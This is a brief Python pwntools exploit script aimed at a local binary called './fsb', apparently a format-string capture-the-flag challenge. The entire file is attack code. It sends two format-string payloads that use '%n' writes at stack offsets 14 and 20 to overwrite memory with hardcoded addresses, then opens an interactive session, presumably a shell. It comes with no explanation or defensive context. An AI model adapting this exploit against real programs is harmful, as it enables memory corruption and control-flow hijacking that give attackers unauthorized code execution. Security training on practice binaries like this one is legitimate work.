from pwn import *

stack_addr = 0x804a004
vuln_addr = 0x804869f

r = process("./fsb")
r.recvuntil(b")")
r.sendline((f"%{stack_addr}c%14$n").encode())
r.recvuntil(b")")
r.sendline((f"%{vuln_addr}c%20$n").encode())
r.interactive()
